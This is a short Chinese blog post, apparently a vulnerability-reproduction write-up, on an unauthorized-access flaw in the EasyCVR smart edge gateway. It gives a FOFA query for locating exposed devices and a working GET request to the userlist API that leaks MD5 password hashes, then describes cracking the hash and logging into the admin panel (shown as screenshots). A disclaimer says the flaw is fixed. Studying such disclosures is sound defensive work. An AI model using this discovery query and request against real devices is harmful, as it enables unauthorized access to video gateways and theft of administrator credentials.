# 原创
：  漏洞复现--EasyCVR智能边缘网关未授权访问

# 漏洞复现--EasyCVR智能边缘网关未授权访问

## 免责声明：

**文章中涉及的漏洞均已修复，敏感信息均已做打码处理，文章仅做经验分享用途，切勿当真，未授权的攻击属于非法行为！文章中敏感信息均已做多层打马处理。传播、利用本文章所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，作者不为此承担任何责任，一旦造成后果请自行**

### 一：漏洞描述

EasyCVR智能边缘网关是TSINGSEE青犀视频旗下一款软硬一体的产品，可提供多协议的设备接入、采集、AI智能检测、处理、分发等服务。该设备userlist接口存在信息泄露，攻击者可获得md5加密后的密码以进行后续测试。

### 二：漏洞影响版本

–EasyCVR智能边缘网关

### 三：网络空间测绘查询

fofa：`title="EasyCVR"`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/657a0406ae9f0e098de744262a3b7049.jpeg"/>

### 四：漏洞复现

poc:<br/> `GET /api/v1/userlist?pageindex=0&amp;pagesize=10`<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/ab895d1c90d512e46fb0be9c0ffda138.jpeg"/><br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/5cc3beb7bfecf95a49811da9ab639ba0.jpeg"/><br/> cmd5解密<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/a43a151dd85c94c1a2337a1e3cc5a3b2.jpeg"/><br/> 登录后台<br/> <img alt="image.png" src="https://img-blog.csdnimg.cn/img_convert/aaa7eb6ca3af4a3f20dc17dc34b54e5b.jpeg"/>
